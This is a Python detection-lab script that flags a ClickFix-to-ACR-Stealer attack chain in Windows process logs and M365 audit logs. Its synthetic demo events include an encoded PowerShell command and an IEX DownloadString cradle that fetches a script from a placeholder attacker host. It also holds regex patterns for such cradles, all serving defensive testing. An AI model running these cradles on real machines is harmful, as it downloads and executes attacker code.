"""ClickFix → ACR Stealer Kill Chain Detection Lab.

Parses Windows process-creation event exports and M365 Unified Audit Log
entries for indicators spanning the full ClickFix social-engineering chain
through ACR Stealer credential theft and OneDrive file exfiltration.

Usage:
    python clickfix_loader_detector.py [log_file] [--log-type both] [--severity low]
    python clickfix_loader_detector.py events.log --log-type exec --severity high
"""
import argparse, json, re, sys
from datetime import datetime, timezone, timedelta
SEV_RANK = {"low": 0, "medium": 1, "high": 2}
STAGES = ["RunDialogAbuse", "PayloadStaging", "StealerExecution", "ExfilTelemetry"]
CHECKLIST = [
    "Block Run-dialog PowerShell clipboard-paste vectors via AppLocker or WDAC.",
    "Block outbound HTTP/S from non-browser processes via egress firewall rules.",
    "Quarantine unsigned executables launched from user-writable paths.",
    "Enforce OneDrive conditional access and per-session download throttling.",
]
ENC  = re.compile(r"-EncodedCommand|-\bec\b|IEX|DownloadString", re.I)
HTTP = re.compile(r"https?://", re.I)
IEX  = re.compile(r"Invoke-Expression|Start-Process", re.I)
CURL = re.compile(r"(curl|wget).*\|", re.I)
TEMP = re.compile(r"(%TEMP%|\\Temp\\|%APPDATA%|\\AppData\\)", re.I)
ART  = re.compile(r"\\([a-z0-9]{1,11}|[0-9]{1,11})\.exe$", re.I)
SYNTH = [
    {"_type":"exec","timestamp":"2026-07-18T08:00:00Z","event_id":4688,"parent_process":"explorer.exe","process_name":"powershell.exe","user":"jdoe","command_line":"powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7AGkAZQB4ACAAJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQAyADMALgBiAGEAZAAvAHAAbAAuAHAAcwAxACcAKQA="},
    {"_type":"exec","timestamp":"2026-07-18T08:01:00Z","event_id":4688,"parent_process":"powershell.exe","process_name":"powershell.exe","user":"jdoe","command_line":"powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('https://evil.tld/payload.ps1')\""},
    {"_type":"exec","timestamp":"2026-07-18T08:03:00Z","event_id":4688,"parent_process":"powershell.exe","process_name":"%TEMP%\\a7f3b.exe","user":"jdoe","command_line":"%TEMP%\\a7f3b.exe --silent"},
    {"_type":"m365","timestamp":"2026-07-18T08:10:00Z","user_principal":"jdoe@contoso.com","operation":"FileDownloaded","object_name":"passwords.kdbx","source_ip":"203.0.113.99","file_count":25},
    {"_type":"m365","timestamp":"2026-07-18T08:11:00Z","user_principal":"jdoe@contoso.com","operation":"FileDownloaded","object_name":"corp_docs.zip","source_ip":"198.51.100.42","file_count":3},
]

def _ts(s):
    try: return datetime.fromisoformat(s.replace("Z", "+00:00"))
    except Exception: return datetime(2000, 1, 1, tzinfo=timezone.utc)

def parse_log(path, log_type):
    if path is None:
        print("[*] No log file — using built-in synthetic demo log.\n")
        return [e for e in SYNTH if log_type == "both" or e["_type"] == log_type]
    events = []
    try:
        with open(path, errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    e = json.loads(line)
                    if "process_name" in e or "command_line" in e:
                        e["_type"] = "exec"
                    elif "user_principal" in e or "operation" in e:
                        e["_type"] = "m365"
                    else:
                        continue
                    events.append(e)
                except json.JSONDecodeError:
                    continue
    except OSError as exc:
        sys.exit(f"ERROR: {exc}")
    return [e for e in events if log_type == "both" or e["_type"] == log_type]

def detect_chain(events):
    hits, seen_ips, m365_buf = [], set(), {}
    for e in events:
        ts = _ts(e.get("timestamp", ""))
        if e["_type"] == "exec":
            proc   = str(e.get("process_name", ""))
            parent = str(e.get("parent_process", "")).lower()
            cmd    = str(e.get("command_line", ""))
            user   = str(e.get("user", ""))
            pname  = proc.lower().split("\\")[-1]
            if parent == "explorer.exe" and pname in ("powershell.exe", "cmd.exe"):
                sev = "high" if ENC.search(cmd) else ("medium" if len(cmd) > 80 else None)
                if sev:
                    hits.append((ts, "RunDialogAbuse", "ExplorerSpawnedShell", sev, user, cmd,
                                 "Restrict shell execution from Run dialog via AppLocker/WDAC."))
            if HTTP.search(cmd) and IEX.search(cmd):
                hits.append((ts, "PayloadStaging", "HTTPDownloadCradle", "high", user, cmd,
                             "Block outbound HTTP/S from non-browser processes at the firewall."))
            if CURL.search(cmd) and HTTP.search(cmd):
                hits.append((ts, "PayloadStaging", "CurlPipeExec", "high", user, cmd,
                             "Block outbound HTTP/S from non-browser processes at the firewall."))
            if TEMP.search(proc) and ART.search(proc):
                hits.append((ts, "StealerExecution", "TempPathArtifact", "high", user, proc,
                             "Quarantine unsigned executables launched from user-writable paths."))
        elif e["_type"] == "m365":
            ip     = str(e.get("source_ip", ""))
            upn    = str(e.get("user_principal", ""))
            op     = str(e.get("operation", ""))
            try:
                fcount = int(e.get("file_count") or 1)
            except (ValueError, TypeError):
                fcount = 1
            if op.lower() == "filedownloaded":
                if ip and ip not in seen_ips:
                    hits.append((ts, "ExfilTelemetry", "NewSourceIP", "medium", upn, ip,
                                 "Enforce OneDrive conditional access for new/unknown source IPs."))
                bucket = m365_buf.setdefault(upn, [])
                bucket.append((ts, fcount))
                cutoff = ts - timedelta(minutes=10)
                bucket[:] = [(t, c) for t, c in bucket if t >= cutoff]
                total = sum(c for _, c in bucket)
                if total > 20:
                    hits.append((ts, "ExfilTelemetry", "BulkDownloadBurst", "high", upn,
                                 f"{total} files in 10-min window",
                                 "Enforce per-session OneDrive download throttling."))
                    bucket.clear()
            seen_ips.add(ip)
    return hits

def report(hits, min_sev):
    # Pass 1: deduplicate all findings across all severity levels before any filtering.
    dedup = {}
    deduped = []
    for hit in sorted(hits, key=lambda h: h[0]):
        ts, stage, rule, sev, actor, indicator, mitigation = hit
        key = (actor, rule)
        last = dedup.get(key)
        if last and (ts - last).total_seconds() < 120:
            continue
        dedup[key] = ts
        deduped.append(hit)

    # Pass 2: count all deduplicated findings, display only those meeting severity threshold.
    total_findings = len(deduped)
    high_count = sum(1 for h in deduped if h[3] == "high")
    found_high = high_count > 0
    displayed = 0

    for hit in deduped:
        ts, stage, rule, sev, actor, indicator, mitigation = hit
        if SEV_RANK[sev] < SEV_RANK[min_sev]:
            continue
        displayed += 1
        ind = str(indicator)[:100]
        print(f"[{sev.upper():6}] {stage:<20} {rule:<25} actor={actor}")
        print(f"         Indicator : {ind!r}")
        print(f"         Mitigation: {mitigation}")

    print(f"\n{'='*70}")
    print("DISRUPTION CHECKLIST (earliest viable intervention first):")
    for i, (stage, action) in enumerate(zip(STAGES, CHECKLIST), 1):
        print(f"  {i}. [{stage}] {action}")
    print(f"{'='*70}")
    print(f"\nSummary: {total_findings} finding(s) ({displayed} displayed, {high_count} high-severity, {total_findings - displayed} suppressed).")
    return found_high

def main():
    ap = argparse.ArgumentParser(
        description="ClickFix → ACR Stealer Kill Chain Detection Lab",
        epilog="Example: python clickfix_loader_detector.py events.log --log-type exec --severity high",
    )
    ap.add_argument("log_file", nargs="?", help="Path to process-creation or M365 UAL export")
    ap.add_argument("--log-type", choices=["exec", "m365", "both"], default="both")
    ap.add_argument("--severity", choices=["low", "medium", "high"], default="low")
    args = ap.parse_args()
    sys.exit(1 if report(detect_chain(parse_log(args.log_file, args.log_type)), args.severity) else 0)

if __name__ == "__main__":
    main()